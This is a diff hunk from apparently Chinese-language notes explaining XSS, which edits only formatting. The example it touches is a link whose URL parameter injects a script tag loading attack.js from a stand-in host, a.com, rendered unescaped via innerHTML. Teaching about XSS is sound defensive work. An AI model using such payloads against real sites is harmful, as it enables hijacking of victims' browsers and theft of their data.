@@ -34,7 +34,7 @@ demo: 表单输入 `<script src >` 然后回来执行
 
 例子：
 
-攻击者诱导被害者打开链接 hzfe.org?name=<script src="http://a.com/attack.js"/>。
+攻击者诱导被害者打开链接` hzfe.org?name=<script src="http://a.com/attack.js"/>`。
 
 被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。
 
